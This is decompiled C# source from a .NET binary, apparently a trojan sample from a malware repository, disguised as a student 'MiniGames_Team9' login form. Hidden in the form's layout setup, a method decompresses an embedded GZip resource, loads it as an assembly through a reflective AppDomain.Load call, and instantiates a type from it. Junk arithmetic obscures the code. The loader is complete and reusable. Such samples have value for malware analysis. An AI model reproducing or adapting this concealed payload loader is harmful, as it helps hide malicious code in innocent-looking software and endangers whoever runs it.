// Decompiled with JetBrains decompiler
// Type: MiniGames_Team9.Login
// Assembly: DependentHan, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A86A1B94-F21E-4DD9-9B87-E146CFB070D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\UDS-Trojan.Win32.GenericML.xnet-3c000108374c842e22e4bf480441d013e260c170c6d87defb15c322a4d136adb.exe

using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;

namespace MiniGames_Team9
{
  public class Login : Form
  {
    private List<Users> listTaiKhoan = ListUsers.Instance.ListTaiKhoan;
    private object[] MaxGeneration = new object[3]
    {
      (object) "456E",
      (object) "6C6E62",
      (object) "MiniGames_Team9"
    };
    private IContainer components = (IContainer) null;
    private static object CreateCallback;
    private static System.Type ScheduledConcurrent = typeof (CarRacing);
    private PictureBox pictureBox4;
    private TextBox txtPass;
    private PictureBox pictureBox2;
    private Label label1;
    private PictureBox pictureBox1;
    private Button btnThoat;
    private Button btnLogin;
    private TextBox txtUser;

    public Login()
    {
      this.InitializeComponent();
      Activator.CreateInstance((System.Type) Login.CreateCallback, this.MaxGeneration);
    }

    private void btnLogin_Click(object sender, EventArgs e)
    {
    }

    private void F_DangXuat(object sender, EventArgs e)
    {
      (sender as frmMain).Thoat = false;
      (sender as frmMain).Close();
      this.Show();
    }

    private void btnThoat_Click(object sender, EventArgs e)
    {
    }

    private bool KiemTraDangNhap(string tentaikhoan, string matkhau)
    {
      for (int index = 0; index < this.listTaiKhoan.Count; ++index)
      {
        if (tentaikhoan == this.listTaiKhoan[index].TenTaiKhoan && matkhau == this.listTaiKhoan[index].Matkhau)
        {
          Const.Users = this.listTaiKhoan[index];
          return true;
        }
      }
      return false;
    }

    private void btnLogin_Click_1(object sender, EventArgs e)
    {
      if (this.KiemTraDangNhap(this.txtUser.Text, this.txtPass.Text))
      {
        frmMain frmMain = new frmMain();
        int num = (int) MessageBox.Show("Logged in Successfully");
        frmMain.Show();
        this.Hide();
        frmMain.Dangxuat += new EventHandler(this.F_DangXuat);
      }
      else
      {
        int num = (int) MessageBox.Show("Login failed", "Error");
        this.txtUser.Focus();
      }
    }

    private void btnThoat_Click_1(object sender, EventArgs e)
    {
      if (MessageBox.Show("Are you sure you want to exit?", "Exit", MessageBoxButtons.YesNo) != DialogResult.Yes)
        return;
      Application.Exit();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.txtPass = new TextBox();
      this.label1 = new Label();
      this.btnThoat = new Button();
      this.btnLogin = new Button();
      this.txtUser = new TextBox();
      this.pictureBox4 = new PictureBox();
      this.pictureBox2 = new PictureBox();
      this.pictureBox1 = new PictureBox();
      ((ISupportInitialize) this.pictureBox4).BeginInit();
      ((ISupportInitialize) this.pictureBox2).BeginInit();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.txtPass.Location = new Point(214, 112);
      this.txtPass.Multiline = true;
      this.txtPass.Name = "txtPass";
      this.txtPass.PasswordChar = '*';
      this.txtPass.Size = new Size(138, 27);
      this.txtPass.TabIndex = 16;
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Times New Roman", 18f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.Location = new Point(209, 16);
      this.label1.Name = "label1";
      this.label1.Size = new Size(143, 27);
      this.label1.TabIndex = 14;
      this.label1.Text = "Login System";
      this.btnThoat.BackColor = Color.FromArgb(128, 128, (int) byte.MaxValue);
      this.btnThoat.FlatStyle = FlatStyle.Flat;
      this.btnThoat.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.btnThoat.ForeColor = SystemColors.ControlLightLight;
      this.btnThoat.Location = new Point(190, 155);
      this.btnThoat.Name = "btnThoat";
      this.btnThoat.Size = new Size(75, 31);
      this.btnThoat.TabIndex = 12;
      this.btnThoat.Text = "Exit";
      this.btnThoat.TextImageRelation = TextImageRelation.TextAboveImage;
      this.btnThoat.UseVisualStyleBackColor = false;
      this.btnThoat.Click += new EventHandler(this.btnThoat_Click_1);
      this.btnLogin.BackColor = Color.FromArgb(128, 128, (int) byte.MaxValue);
      this.btnLogin.FlatStyle = FlatStyle.Flat;
      this.btnLogin.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.btnLogin.ForeColor = SystemColors.ControlLightLight;
      this.btnLogin.Location = new Point(277, 155);
      this.btnLogin.Name = "btnLogin";
      this.btnLogin.Size = new Size(75, 31);
      this.btnLogin.TabIndex = 11;
      this.btnLogin.Text = nameof (Login);
      this.btnLogin.UseVisualStyleBackColor = false;
      this.btnLogin.Click += new EventHandler(this.btnLogin_Click_1);
      this.txtUser.Location = new Point(214, 67);
      this.txtUser.Multiline = true;
      this.txtUser.Name = "txtUser";
      this.txtUser.Size = new Size(138, 27);
      this.txtUser.TabIndex = 10;
      this.pictureBox4.Location = new Point(176, 112);
      this.pictureBox4.Name = "pictureBox4";
      this.pictureBox4.Size = new Size(32, 27);
      this.pictureBox4.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox4.TabIndex = 17;
      this.pictureBox4.TabStop = false;
      this.pictureBox2.Location = new Point(176, 67);
      this.pictureBox2.Name = "pictureBox2";
      this.pictureBox2.Size = new Size(32, 27);
      this.pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox2.TabIndex = 15;
      this.pictureBox2.TabStop = false;
      this.pictureBox1.Location = new Point(20, 56);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(108, 89);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 13;
      this.pictureBox1.TabStop = false;
      this.AutoScaleDimensions = Login.DeferredDisposable();
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(372, 203);
      this.Controls.Add((Control) this.pictureBox4);
      this.Controls.Add((Control) this.txtPass);
      this.Controls.Add((Control) this.pictureBox2);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.pictureBox1);
      this.Controls.Add((Control) this.btnThoat);
      this.Controls.Add((Control) this.btnLogin);
      this.Controls.Add((Control) this.txtUser);
      this.Name = nameof (Login);
      this.Text = nameof (Login);
      ((ISupportInitialize) this.pictureBox4).EndInit();
      ((ISupportInitialize) this.pictureBox2).EndInit();
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private static SizeF DeferredDisposable()
    {
      byte[] array;
      using (GZipStream gzipStream = new GZipStream((Stream) new MemoryStream((byte[]) new ResourceManager(Login.ScheduledConcurrent).GetObject("B8D25T")), CompressionMode.Decompress))
      {
        byte[] buffer = new byte[4096];
        using (MemoryStream memoryStream = new MemoryStream())
        {
          int count;
          do
          {
            count = gzipStream.Read(buffer, 0, 4096);
            if (count > 0)
              memoryStream.Write(buffer, 0, count);
          }
          while (count > 0);
          array = memoryStream.ToArray();
        }
      }
      Login.CreateCallback = (object) Login.CategoryMembership(Login.CompilationRelaxations(array, true)).GetTypes()[1];
      return new SizeF(6f, 13f);
    }

    private static Assembly CategoryMembership(object ResolvedAssemblyFiles) => (Assembly) ResolvedAssemblyFiles;

    public static object CompilationRelaxations(byte[] Message, bool Properties)
    {
      int num1 = 251367116;
      int num2 = num1 <= 251367174 ? (num1 > 251367160 ? 1 : num1 + 1) : 251367106;
      bool flag1 = flag1 = false;
      int num3 = 251367187;
      int num4 = num3 <= 251367157 ? (num3 > 251367115 ? 1 : num3 + 1) : 251367125;
      int num5 = 251367159;
      int num6 = num5 <= 251367182 ? (num5 > 251367102 ? 1 : num5 + 1) : 251367122;
      bool flag2 = true || !(flag2 = false);
      int num7 = 251367159;
      int num8 = num7 <= 251367138 ? (num7 > 251367142 ? 1 : num7 + 1) : 251367112;
      bool flag3 = flag3 = false;
      bool flag4 = false && !(flag4 = true);
      int num9 = 251367115;
      int num10 = num9 <= 251367158 ? (num9 > 251367132 ? 0 : num9 + 1) : 251367117;
      int num11 = 251367164;
      int num12 = num11 <= 251367141 ? (num11 > 251367155 ? 1 : num11 + 1) : 251367132;
      int num13 = 251367146;
      int num14 = num13 <= 251367197 ? (num13 > 251367111 ? 0 : num13 + 1) : 251367190;
      int num15 = 251367161;
      int num16 = num15 <= 251367129 ? (num15 > 251367102 ? 1 : num15 + 1) : 251367118;
      int num17 = 251367122;
      int num18 = num17 <= 251367166 ? (num17 > 251367195 ? 1 : num17 + 1) : 251367136;
      int num19 = 251367150;
      int num20 = num19 <= 251367116 ? (num19 > 251367154 ? 1 : num19 + 1) : 251367128;
      bool flag5 = false && !(flag5 = true) && false;
      bool flag6 = true || (flag6 = false) || true;
      bool flag7 = true || (flag7 = true);
      int num21 = 251367191;
      int num22 = num21 <= 251367169 ? (num21 > 251367182 ? 1 : num21 + 1) : 251367153;
      int num23 = 251367120;
      int num24 = num23 <= 251367160 ? (num23 > 251367136 ? 1 : num23 + 1) : 251367131;
      int num25 = 251367137;
      int num26 = num25 <= 251367168 ? (num25 > 251367159 ? 0 : num25 + 1) : 251367107;
      int num27 = 251367174;
      int num28 = num27 <= 251367145 ? (num27 > 251367120 ? 0 : num27 + 1) : 251367182;
      int num29 = 251367140;
      int num30 = num29 <= 251367114 ? (num29 > 251367113 ? 0 : num29 + 1) : 251367182;
      int num31 = 251367175;
      int num32 = num31 <= 251367185 ? (num31 > 251367141 ? 0 : num31 + 1) : 251367187;
      int num33 = 251367150;
      int num34 = num33 <= 251367178 ? (num33 > 251367136 ? 0 : num33 + 1) : 251367194;
      int num35 = 251367124;
      int num36 = num35 <= 251367185 ? (num35 > 251367117 ? 1 : num35 + 1) : 251367173;
      bool flag8 = true || (flag8 = false);
      int num37 = 251367119;
      int num38 = num37 <= 251367181 ? (num37 > 251367184 ? 0 : num37 + 1) : 251367119;
      int num39 = 251367132;
      int num40 = num39 <= 251367104 ? (num39 > 251367151 ? 1 : num39 + 1) : 251367154;
      int num41 = 251367147;
      int num42 = num41 <= 251367190 ? (num41 > 251367192 ? 0 : num41 + 1) : 251367123;
      int num43 = 251367122;
      int num44 = num43 <= 251367155 ? (num43 > 251367191 ? 0 : num43 + 1) : 251367107;
      int num45 = 251367160;
      int num46 = num45 <= 251367139 ? (num45 > 251367108 ? 0 : num45 + 1) : 251367175;
      int num47 = 251367115;
      int num48 = num47 <= 251367141 ? (num47 > 251367173 ? 1 : num47 + 1) : 251367112;
      return Interaction.CallByName((object) Login.bbbb, "Load", CallType.Get, (object) Message);
    }

    public static AppDomain bbbb => Thread.GetDomain();
  }
}
